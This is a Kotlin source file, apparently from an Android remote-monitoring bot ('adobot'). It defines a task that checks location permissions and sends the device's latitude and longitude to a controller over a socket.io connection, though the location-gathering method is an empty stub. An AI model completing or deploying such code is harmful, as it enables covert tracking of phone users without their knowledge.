package me.adobot.tasks

import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.support.v4.app.ActivityCompat
import android.support.v4.content.ContextCompat
import io.socket.client.Socket
import org.json.JSONObject


/**
 * Created by Abhinav_Suthar on 17-03-2018.
 */

class LocationMonitor(private val ctx: Context, private val socket: Socket) : BaseTask(ctx) {


    private fun getLocation() {
        //Implement location
    }

    override fun run() {
        super.run()

        if (ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            getLocation()
        } else requestPermissions()
    }

    private fun uploadLocation(location: Location) {
        val obj = JSONObject()
        obj.put("lat", location.latitude)
        obj.put("lon", location.longitude)

        foo(obj.toString())
    }

    private fun foo(str: String) {
        val data = JSONObject()
        data.put("location", str)
        data.put("dataType", "location")

        socket.emit("usrData", data)
    }

}